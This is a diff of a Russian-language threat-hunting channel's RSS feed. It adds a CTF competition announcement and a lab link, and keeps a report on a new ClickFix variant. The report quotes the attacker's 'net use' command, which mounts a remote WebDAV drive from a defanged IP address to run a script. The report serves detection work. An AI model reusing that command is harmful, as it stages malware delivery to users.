@@ -1,5 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Wed, 18 Mar 2026 05:37:50 +0000</lastBuildDate><item><title>New Click-Fix Variant (Cloudflare Win + R)</title><link>https://t.me/ThreatHuntingFather/1232</link><description>New Click-Fix Variant (Cloudflare Win + R)
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Wed, 18 Mar 2026 09:25:37 +0000</lastBuildDate><item><title>🌸 Келе жатқан Наурыз мейрамы құтты болсын! 🌸</title><link>https://t.me/ThreatHuntingFather/1238</link><description>🌸 Келе жатқан Наурыз мейрамы құтты болсын! 🌸
+Наша команда FR13NDS TEAM совместно с Astana IT University анонсирует масштабное соревнование по кибербезопасности - AITU CTF 2026! 💻
+Соревнование пройдет в два этапа:
+🔹 ЭТАП 1: КВАЛИФИКАЦИЯ (Online Jeopardy)
+В финал пройдут 10 команд из Казахстана и 5 зарубежных команд.
+* Состав команды: от 1 до 5 человек.
+* Старт соревнований: 23 марта, 12:00 (GMT+5)
+* Завершение: 24 марта, 00:00 (GMT+5) *(продолжительность 12 часов)*
+🔹 ЭТАП 2: ФИНАЛ (Offline)
+Прошедших отбор ждет финал в столице!
+* Даты: 22–23 апреля 2026 г.
+* Место: Астана, Astana IT University.
+* Формат: Киберполигон 🛡⚔️
+* Доп. активности: Geoguessr Tournament и другие классные интерактивы! 🗺✨
+💰 Предварительный общий призовой фонд: 1 000 000 ₸
+*(Точное распределение по призовым местам и специальным номинациям объявим чуть позже — следите за новостями!)*
+🔗 Наши ресурсы:
+❤️ CTFtime: https://ctftime.org/event/3204
+🌐 Платформа / Регистрация: ctf.fr13nds.team
+📢 Telegram: @fr13nds_ctf | @ctf_aituniversity
+💬 Discord: https://discord.gg/9qB9sv8Y
+
+[Media: Фото]</description><pubDate>Wed, 18 Mar 2026 09:25:37 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1238</guid></item><item><title>Вы знаете что делать 😃</title><link>https://t.me/ThreatHuntingFather/1237</link><description>Вы знаете что делать 😃
+https://www.threathuntinglabs.com/</description><pubDate>Wed, 18 Mar 2026 06:16:59 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1237</guid></item><item><title>New Click-Fix Variant (Cloudflare Win + R)</title><link>https://t.me/ThreatHuntingFather/1232</link><description>New Click-Fix Variant (Cloudflare Win + R)
 Исследователи Atos зафиксировали новый вариант техники ClickFix, в котором злоумышленники убеждают пользователя выполнить вредоносную команду через диалог Win + R.
 В отличие от предыдущих итераций, где использовались PowerShell или MSHTA, здесь применяется net use для монтирования удалённого WebDAV-диска с последующим запуском .cmd скрипта с этого диска:
 cmd.exe /c net use Z: http://94.156.170[.]255/webdav /persistent:no
